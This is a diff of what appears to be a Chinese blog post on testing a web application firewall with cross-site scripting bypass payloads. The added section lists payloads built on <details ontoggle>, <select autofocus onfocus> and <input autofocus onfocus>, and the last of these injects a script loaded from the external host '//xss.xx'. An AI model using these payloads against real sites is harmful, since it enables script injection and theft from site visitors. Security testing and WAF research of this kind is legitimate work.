@@ -13,7 +13,7 @@
 - - -
 既然来了测试下，先从容易满足的点出发，我就假设有个参数`?xss=`后面不用考虑闭合之类的，毕竟实战遇到的点各有不同。
 
-首先来看个鸡肋而有趣的例子在推特看到的，作者@`sOmd3v @Ow4ys`
+首先来看个鸡肋而有趣的例子在推特看到的，作者`@sOmd3v @Ow4ys`
 
 `<x oncopy=y=prompt,y``>z` `<x onpaste=y=prompt,y``>z`
 
@@ -31,3 +31,12 @@
 
 ![7.png](https://ae01.alicdn.com/kf/Uafa9f3e5e9654b3cb61d886f8c70b7afU.png)
 
+## 更多payload
+- - -
+说实话，我在测这个waf时，过程很顺利，可能是我测过几个waf的原因，感觉对xss检测不是很严，可能是我测试的环境`太乐观了`，毕竟实战各种`鸡肋环境`，但是我发现对于HTML5新出的几个标签属性还是没过滤的，还有少数waf，on事件没过滤全，可能有些on事件属于比较鸡肋的。
+
+```
+<details open ontoggle=[1].find(alert)>
+<select autofocus onfocus=[2].find(alert)>
+<input autofocus onfocus=s=createElement("scriPt");body.appendChild(s);s.src="//xss.xx/1te">
+```
